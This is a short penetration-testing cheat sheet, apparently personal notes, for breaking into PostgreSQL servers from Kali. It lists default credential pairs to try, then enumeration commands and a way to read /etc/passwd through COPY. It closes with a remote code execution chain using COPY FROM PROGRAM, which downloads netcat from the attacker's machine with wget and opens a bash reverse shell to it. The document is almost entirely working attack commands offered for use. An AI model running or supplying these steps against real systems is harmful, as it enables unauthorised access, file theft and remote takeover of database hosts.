Try logging in with the following command and common creds:

```bash - kali
psql -h $TARGET -U postgres -p 5432
```

postgres : postgres
postgres : password
postgres : admin
admin : admin
admin : password

#### Database navigation
List all databases
```sql - postgresql
\l
```

Use specific database
```sql - postgresql
\c <DATABASE>
```

List all tables in current database
```sql - postgresql
\dt
```

Describe a table
```sql - postgresql
\d <TABLENAME>
```

Get user roles
```sql - postgresql
\du+
```


#### Read a file
```sql - postgresql
CREATE TABLE demo(t text);
```

```sql - postgresql
COPY demo from '/etc/passwd';
```

```sql - postgresql
SELECT * FROM demo;
```

#### Directory traversal
```sql - postgresql
select pg_ls_dir('./');
```

#### Remote Code Execution

In Kali:
```bash - kali
which nc
```

```bash - kali
cp /usr/bin/nc .
```

![[Python#Server]]

In postgres:

```sql - postgresql
\c postgres;
```

Clean up after yourself
```sql - postgresql
DROP TABLE IF EXISTS cmd_exec;
```

Create the table you want to hold the command output
```sql - postgresql
CREATE TABLE cmd_exec(cmd_output text);
```

Run the system command via the COPY FROM PROGRAM function
```sql - postgresql
COPY cmd_exec FROM PROGRAM 'wget http://$KALI/nc';
```

```sql - postgresql
DELETE FROM cmd_exec;
```

![[rlwrap]]

```sql - postgresql
COPY cmd_exec FROM PROGRAM 'nc -n $KALI 80 -e /usr/bin/bash';
```
